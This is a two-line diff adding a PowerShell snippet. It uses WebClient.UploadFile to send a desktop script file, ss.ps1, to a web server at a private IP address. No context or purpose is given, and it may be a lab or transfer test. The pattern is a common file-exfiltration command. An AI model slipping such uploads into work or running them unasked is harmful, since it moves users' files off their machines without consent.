@@ -1,0 +1,2 @@
+$wc = New-Object System.Net.WebClient
+$wc.UploadFile('http://192.168.150.2:8000/', 'C:\Users\sesan\OneDrive\Desktop\ss.ps1')
